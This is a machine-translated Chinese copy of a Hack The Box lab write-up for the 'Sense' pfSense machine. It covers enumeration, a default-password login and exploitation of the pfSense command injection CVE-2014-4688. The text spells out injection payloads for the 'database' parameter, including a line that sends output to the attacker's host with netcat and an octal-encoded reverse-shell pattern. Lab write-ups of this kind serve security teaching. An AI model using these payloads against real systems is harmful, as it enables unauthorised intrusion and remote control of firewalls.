<html>
<head>
<title>Dive into Sense — Hack the Box</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">深入了解——黑掉盒子</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/dive-into-sense-hack-the-box-2f700ef7f09c?source=collection_archive---------1-----------------------#2020-06-20">https://infosecwriteups.com/dive-into-sense-hack-the-box-2f700ef7f09c?source=collection_archive---------1-----------------------#2020-06-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/fcf439eb8666f4e1fe6802fdf248c342.png" data-original-src="https://miro.medium.com/v2/resize:fit:1176/format:webp/1*8yvKjaeLikdvgyqAHMDXIw.png"/></div></figure><p id="321a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">Sense是流行的pen-test平台<a class="ae ks" href="https://www.hackthebox.eu/" rel="noopener ugc nofollow" target="_blank"> Hack The Box </a>上的一台容易退役的机器。在这篇文章中，我将向您展示如何使用一个已知的公共脚本来利用它，并通过编写一个定制的有效负载来手动利用它们。</p><p id="b58b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">首先，让我们运行Nmap来发现这台机器中开放的端口:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi kt"><img src="../Images/01c681f193ddd695d267191fb5df6c39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/1*DgqqM_Zor2M_BZSraxP9GA.png"/></div></figure><p id="7401" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">端口80和443上运行着一台web服务器。在浏览器上访问它，我们会看到一个Pfsense登录页面:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi ky"><img src="../Images/fb9c239b57ea4b7f787927e938d6a9ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:984/format:webp/1*Z33QyDyQ8f51413kBaD_gQ.png"/></div></figure><p id="6dee" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在谷歌上快速搜索会向我们展示Pfsense的默认凭据。也许管理员没有遵循最佳实践，没有更改默认配置。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi kz"><img src="../Images/9be9e9a61e35494b771fc09251cdfb57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1226/format:webp/1*Xh2sKqf8wLDAGeQJSs5wQw.png"/></div></figure><p id="9442" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">不幸的是，这些凭证不起作用。因此，我们将尝试模糊网络应用程序，以找到有趣的文件。</p><p id="9ca3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">Dirbuster是一个帮助我们模糊化web应用程序的伟大工具。让我们启动UI并设置我们想要测试的URL(在我们的例子中是<a class="ae ks" href="https://10.10.10.60/" rel="noopener ugc nofollow" target="_blank"> https://10.10.10.60/ </a>)。Dirbuster有一些默认的单词表，对于这篇文章，我选择了中小写的目录列表。在Kali中，它位于<em class="la">/usr/share/dir buster/word list/</em>。</p><p id="c7c4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们来搜索一下<em class="la">。txt </em>和<em class="la">。php </em>文件扩展名也是。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi lb"><img src="../Images/7f5935ab0c8f35be6012170ca7062d67.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fmLzEvIbrf5C_cksUeURuA.png"/></div></div></figure><p id="ac84" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">扫描完成后，我们可以注意到几个文件。大多数的<em class="la">。php </em>文件呈现登录页面，但是另外两个文件似乎很有趣。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi lg"><img src="../Images/e39db2e7cf43eff329e547ee0222ba5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aoi_lRe-dY02RGZ8_RvlFA.png"/></div></div></figure><p id="38dd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">首先我们来看看<em class="la"> changelog.txt </em>文件。似乎这个系统还有一个已知的漏洞。让我们记住它。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi lh"><img src="../Images/5781477bfeef1db3147161d4231ec443.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*3dG0_UGNLxZWto7DuBQ8hw.png"/></div></div></figure><p id="5f82" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，检查<em class="la"> system-users.txt </em>和…太好了！我们发现了用户名。我们没有密码，但有一个提示，这是一个默认密码。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi li"><img src="../Images/73316e30633357b6847098db8588f2c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:998/format:webp/1*MRTcAijSqoEqsnmfdP_ALQ.png"/></div></figure><p id="de30" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在登录页面上输入<em class="la"> rohit </em>和<em class="la"> pfsense </em>后，我们可以看到一个控制面板:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi lj"><img src="../Images/8fc5b7b77329c19888e6b5096a6b0545.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4MiklR2K5lVU6I5Doukkcw.png"/></div></div></figure><p id="abd9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在左侧面板中，我们可以看到当前安装的Pfsense版本:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/e798abfa4855d2a8f9e38c5991f59457.png" data-original-src="https://miro.medium.com/v2/resize:fit:778/format:webp/1*_cWKddVbWdfLr6cEdpKdLw.png"/></div></figure><p id="0a85" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">知道系统还有一个未打补丁的漏洞，我们来搜索一下这个版本相关的常见漏洞。在<a class="ae ks" href="https://www.cvedetails.com/vulnerability-list/vendor_id-19535/product_id-51466/version_id-289733/Netgate-Pfsense-2.1.3.html" rel="noopener ugc nofollow" target="_blank"> Pfsense 2.1.3 CVE页面</a>可能会注意到很多漏洞。其中一个非常有趣，因为它可以通过Exec代码漏洞引导我们进行用户级访问。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi ll"><img src="../Images/06a302cde9939b21f35d934566107355.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2vNe8TIL-X4AQGSToIcfBA.png"/></div></div></figure><p id="3c4a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，让我们来了解一下<a class="ae ks" href="https://www.cvedetails.com/cve/CVE-2014-4688/" rel="noopener ugc nofollow" target="_blank">CVE-2014–4688</a>。</p><h1 id="6902" class="lm ln iq bd lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj bi translated">了解漏洞</h1><p id="878a" class="pw-post-body-paragraph ju jv iq jw b jx mk jz ka kb ml kd ke kf mm kh ki kj mn kl km kn mo kp kq kr ij bi translated">官方报告称有三条易受攻击的路线:</p><blockquote class="mp mq mr"><p id="3cba" class="ju jv la jw b jx jy jz ka kb kc kd ke ms kg kh ki mt kk kl km mu ko kp kq kr ij bi translated">二。问题描述</p><p id="d875" class="ju jv la jw b jx jy jz ka kb kc kd ke ms kg kh ki mt kk kl km mu ko kp kq kr ij bi translated">在安全审计期间，在pfSense WebGUI中发现了多个命令注入漏洞。</p><p id="2729" class="ju jv la jw b jx jy jz ka kb kc kd ke ms kg kh ki mt kk kl km mu ko kp kq kr ij bi translated">* diag _ DNS . PHP中的命令注入[CVE-2014–4688]</p><p id="9b56" class="ju jv la jw b jx jy jz ka kb kc kd ke ms kg kh ki mt kk kl km mu ko kp kq kr ij bi translated">* diag _ smart . PHP中的命令注入[CVE-2014–4688]</p><p id="9551" class="ju jv la jw b jx jy jz ka kb kc kd ke ms kg kh ki mt kk kl km mu ko kp kq kr ij bi translated">* status _ RRD _ graph _ img . PHP中的命令注入[CVE-2014–4688]</p></blockquote><p id="b522" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在我们的例子中，我们只能访问最后一个文件，<em class="la"> status_rrd_graph_img.php </em>:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi mv"><img src="../Images/ada45e751e1900a3b8d19371d39c8c1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vWVlKZMAIK_6uPTPh97D0w.png"/></div></div></figure><p id="f92d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这份文件给了我们更多的细节:</p><blockquote class="mp mq mr"><p id="bd00" class="ju jv la jw b jx jy jz ka kb kc kd ke ms kg kh ki mt kk kl km mu ko kp kq kr ij bi translated">传递给status_rrd_graph_img.php的数据库值没有经过正确的验证或清理。作为“数据库”值发送的巧尽心思构建的字符串会触发该漏洞。</p></blockquote><p id="00d6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">所以我们知道哪条路线和哪个参数是易受攻击的。现在我们已经了解了问题所在，让我们使用searchsploit搜索一个脚本，它可以为我们提供一个shell。为此，只需运行<em class="la">searchsploit</em>p<em class="la">f sense</em>即可。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi mw"><img src="../Images/3afb780e38e189558bdb105eb02a24d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oKUeEiX1zrlzW33Tr4BwFQ.png"/></div></div></figure><p id="47a4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们想要的漏洞是<em class="la"> php/webapps/46538.py </em>。让我们看看代码，以便更好地理解它在做什么。只需运行<em class="la">searchsploit-x PHP/web apps/46538 . py</em>:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi mx"><img src="../Images/0ec53af3cdc1e541d854ac24780a5bf2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jiC9boMabfJloxsX9gZaIQ.png"/></div></div></figure><p id="c2af" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如上所述，这个Python脚本设置了一个八进制编码的python reverse shell，它将作为一个值传递给<em class="la">数据库</em>参数。最终的URL有效负载必须采用以下格式:</p><pre class="ku kv kw kx gt my mz na nb aw nc bi"><span id="8743" class="nd ln iq mz b gy ne nf l ng nh">/status_rrd_graph_img.php?database=queues;printf'&lt;octal_enc_cmd&gt;'|sh</span></pre><p id="ef5a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">但是为什么我们需要以这种奇怪的格式传递命令呢？</p><p id="26bb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">首先，让我们理解为什么我们需要使用<em class="la">队列</em>数据库。在Google上搜索有可能从<em class="la">status _ RRD _ graph _ img . PHP</em>得到源代码。看一下这段代码:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi ni"><img src="../Images/c6a45c9cc96ee20de0057d5e816bde2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QiELYh7uA_XwlA8SdOZiyA.png"/></div></div></figure><p id="7964" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="la"> strstr(str1，str2) </em> PHP函数验证<em class="la"> str1 </em>中是否出现<em class="la"> str2 </em>。因此，正如您在上面看到的，如果数据库参数中存在一个<em class="la"> queues </em>或<em class="la"> queuesdrop </em>字符串，就会调用<em class="la"> exec </em>函数。我们也可以使用<em class="la"> queuesdrop </em>，这没什么区别。</p><p id="49c5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">好，对！但是为什么是八进制格式呢？</strong></p><p id="23a1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们之所以使用它，是因为尽管该应用程序容易受到代码执行的攻击，但有些字符很难通过。出现这种情况是因为<em class="la">status _ RRD _ graph _ img . PHP</em>的PHP代码读取数据库参数，直到第一个反斜杠参数('/')。简单的命令仍然可以直接执行，例如:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi nj"><img src="../Images/604978e5eab83b7aa024619753dd4487.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RkBEozHpXZ4uzQ-jnzWg4g.png"/></div></div></figure><p id="121b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在这里，我只是调用了易受攻击的路由，并将数据库参数传递为:</p><pre class="ku kv kw kx gt my mz na nb aw nc bi"><span id="69ef" class="nd ln iq mz b gy ne nf l ng nh">queues;echo+'abc'+|nc+10.10.14.4+4444</span></pre><p id="0fa3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这个命令只是捕捉<em class="la"> echo </em>命令(‘ABC’)的输出，并通过Netcat发送给我的机器。重要的是，在请求这个路由之前，我需要通过键入以下命令来启动一个本地服务器:</p><pre class="ku kv kw kx gt my mz na nb aw nc bi"><span id="e3c5" class="nd ln iq mz b gy ne nf l ng nh">nc -lnvp 4444</span></pre><p id="c799" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">正如你在下面看到的，它是有效的:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/9452179ec6d5601aa8d6bf8adb6750c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1068/format:webp/1*FCRBkjGWzgzh_Y7wuqB4Cg.png"/></div></figure><p id="1557" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">但是您可以注意到传递路径参数会导致失败。所以使用八进制方法是规范化这些字符并执行所有操作的更好方法。</p><p id="9342" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">基本上，事情是这样的:</p><p id="c3b8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">printf&lt;octal _ enc _ str&gt;T1】只是一个打印函数，将八进制字符串打印成文本</strong></p><p id="d34b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> | sh </strong>意味着我们将之前<em class="la"> printf </em>生成的输出重定向为<em class="la"> sh </em>程序的输入，所以现在我们将这个字符串作为外壳代码执行。</p><p id="febf" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们确切地知道了这里发生了什么，让我们来获取用户和根标志！首先，我将展示如何利用我们之前发现的python漏洞来利用它。然后，我们将通过使用Netcat获得一个shell来手动利用漏洞。</p><h1 id="7691" class="lm ln iq bd lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj bi translated">使用Python脚本</h1><p id="cea7" class="pw-post-body-paragraph ju jv iq jw b jx mk jz ka kb ml kd ke kf mm kh ki kj mn kl km kn mo kp kq kr ij bi translated">首先，让我们通过键入以下命令使用Netcat启动我们的本地监听器:</p><pre class="ku kv kw kx gt my mz na nb aw nc bi"><span id="2470" class="nd ln iq mz b gy ne nf l ng nh">nc -lnvp 4444</span></pre><p id="797d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在让我们回到<em class="la"> searchsploit </em>，看看我们需要设置的脚本参数:</p><p id="c6e7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后，执行它:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi nl"><img src="../Images/08bf42e584134a509fedb4ec747bf0b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D8WGxRHSJnn9k23WhlYRrA.png"/></div></div></figure><p id="906b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">好像剧本已经写完了。现在，让我们检查一下我们的服务器:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/3422045cf3b02e9faa1bb96c98c72eab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1078/format:webp/1*9R2RYFXDEWy4sq3LHpYnEQ.png"/></div></figure><p id="b6a7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">太好了，是根用户！现在只需要搜索标志:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/8db951fc20d3587707cb4258bdf762d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:516/format:webp/1*3Ecg9VS56HOi_ChywggrhA.png"/></div></figure><h1 id="72d8" class="lm ln iq bd lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj bi translated">没有剧本</h1><p id="5740" class="pw-post-body-paragraph ju jv iq jw b jx mk jz ka kb ml kd ke kf mm kh ki kj mn kl km kn mo kp kq kr ij bi translated">好吧，那个剧本完美地完成了！但是我们能用另一种壳技术繁殖吗？当然，我们已经知道如何利用这个漏洞！现在让我们使用Netcat反向shell来完成它。我喜欢用Netcat，因为一台机器更有可能有Netcat，而不是某个特定的语言。Netcat默认安装在一些基于Linux的系统中。</p><p id="f53d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">为此，Msfvenom将帮助我们。让我们搜索反向shell负载:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi no"><img src="../Images/fbc8b820efce226d7ff7a69b099f66ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lLzigfTnNkZTjn8E5Z_ycQ.png"/></div></div></figure><p id="346e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们需要<em class="la">cmd/UNIX/reverse _ netcat</em>有效负载。让我们来看看我们需要传递的参数:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi np"><img src="../Images/8d601e5e0b32b212f6ea18e066cd9fc4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4_3KOsbgYOGuMROmzdVfBQ.png"/></div></div></figure><p id="0e4e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这个有效负载将生成一个基于Netcat的shell，我们只需要传递本地主机和本地端口值作为默认值(4444)。</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi nq"><img src="../Images/bb464413d00a2f7bc502bfd9b4795d41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tpske-sYRC3ikoAVHfjegw.png"/></div></div></figure><p id="77be" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们有了有效载荷，让我们把它转换成一个八进制字符串。这可以通过脚本或任何在线工具来完成。转换后，我们应该将其传递给<em class="la"> printf </em>命令，如下所示:</p><pre class="ku kv kw kx gt my mz na nb aw nc bi"><span id="7b9e" class="nd ln iq mz b gy ne nf l ng nh">queues;printf+'\155\153\146\151\146\157\40(...)'|sh</span></pre><p id="8fb7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们只需要像以前一样使用Netcat启动本地服务器，然后在浏览器中请求URL:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="lc ld di le bf lf"><div class="gh gi nr"><img src="../Images/7e1d1fe13b9f0d962dff433bd93cdf17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q7BYgwFdpte5YI-bJcQ2yw.png"/></div></div></figure><p id="2fb0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后，正如你在下面看到的，它成功了:</p><figure class="ku kv kw kx gt jr gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/15e016b9441ac7f454d52d527264341b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1286/format:webp/1*WmYMABbvgNkVLmGv8IsGcg.png"/></div></figure><p id="456a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">参考资料:</p><ul class=""><li id="48bf" class="nt nu iq jw b jx jy kb kc kf nv kj nw kn nx kr ny nz oa ob bi translated"><a class="ae ks" href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/" rel="noopener ugc nofollow" target="_blank">千变万化安全— Pfsense漏洞</a></li></ul><p id="209e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">查看我的另一篇关于蹩脚盒子的文章:</p><ul class=""><li id="cb48" class="nt nu iq jw b jx jy kb kc kf nv kj nw kn nx kr ny nz oa ob bi translated"><a class="ae ks" href="https://medium.com/rd-shipit/dive-into-hack-the-box-lame-ec44fccb5711" rel="noopener">潜入Lame —黑掉盒子</a></li></ul></div></div>    
</body>
</html>